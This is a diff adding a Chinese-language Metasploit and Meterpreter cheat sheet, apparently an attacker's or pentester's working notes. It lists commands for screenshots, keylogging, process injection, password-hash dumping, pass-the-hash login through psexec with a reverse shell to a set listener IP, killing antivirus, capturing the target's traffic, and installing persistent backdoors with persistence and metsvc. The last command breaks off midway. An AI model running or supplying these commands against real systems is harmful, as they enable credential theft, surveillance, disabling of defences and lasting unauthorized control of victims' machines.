@@ -1,0 +1,66 @@
+截屏 screenshot
+获取系统运行的平台 sysinfo
+获取键盘记录
+keyscan_start
+keyscan_dump
+ps查看进程
+migrate 1774 切换进程（注入）
+
+keyscan_start  开始
+keyscan_dump 返回
+keyscan_stop 停止
+run post/windows/capture/keylog_recorder 记录键盘输入
+
+获取用户hash值
+hashdump
+利用hash登录
+msfcosole
+use exploit/windows/smb/psexec
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.2.133
+set LPORT 1211
+set RHOST 192.168.2.131
+set SMBPass hash值
+set SMBUser administrator
+exploit
+
+
+持久控制pc（在meterpreter）
+进程迁移
+run post/windows/manage/migrate
+关闭杀软
+run killav
+关闭进程
+kill 进程号
+查看目标机所有流量
+run packetrecorder -i 1
+提取系统信息
+run scraper
+
+持久控制一
+run persistence -X -i 50 -p 1121 -r 192.168.2.133
+msfcosole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+setg LPORT 1121
+setg LHOST 192.168.2.133
+exploit
+sessions -u 2 升级shell变meterpreter
+
+持久控制服务器
+前提条件服务器系统可以
+run metsvc -A 安装后门
+
+msfconsole
+use exploit/multi/handler
+set payload windows/metsvc_bind_tcp
+set LHOST 192.168.2.133
+set LPORT 31337
+set RHOST 192.168.2.131
+set R
+
+
+
+
+
+
